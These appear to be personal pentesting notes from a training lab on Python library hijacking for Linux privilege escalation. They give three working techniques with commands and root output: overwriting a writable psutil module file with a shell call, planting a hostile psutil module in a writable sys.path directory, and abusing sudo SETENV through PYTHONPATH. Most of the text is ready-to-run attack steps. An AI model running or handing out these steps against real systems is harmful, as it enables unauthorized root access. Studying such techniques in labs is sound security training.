# Python library hijacking

discover any script work on SUID Privilege then try to discover the content of this file for searching to any function can we abuse of her content

```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
# we choose pustil becuse we imported this library on the script
# then discover any file have a writeble permission

 ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
 #then
 echo "import os;os.system('/bin/bash')" > /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

### **Wrong Write Permissions**

then hijack this file

```bash
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	**import os
	os.system('id')**
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

privesc

```bash
sudo  ./script.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%

```

***

### **Library Path**

first when import library in python the system start search first in the directory of this script then if not found this library it will start search on **`sys.path` . we aim to abuse on this path to add file with the name of library to take a root permission**

```bash
 **# discover pathes
 python3 -c 'import sys; print("\n".join(sys.path))'**
```

_**locate of library**_

```bash
pip3 show psutil
# psutil is a library
```

_**Discover directory permission**_

```bash
ls -lad /usr/lib/python3.8
```

After checking all of the directories listed, it appears that `/usr/lib/python3.8` path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the `PYTHONPATH` variable, we can see that this path is higher on the list than the path in which `psutil` is installed in. Let us try abusing this misconfiguration to create our own `psutil` module containing our own malicious `virtual_memory()` function within the `/usr/lib/python3.8` directory.

_**Hijack Module**_

```bash
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

_**Privesc**_

```bash
 sudo /usr/bin/python3 mem_status.py
```

***

### **PYTHONPATH Environment Variable**

must have `SETENV` in sudo permission

```bash
 sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

```bash
# manipulate with path
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```
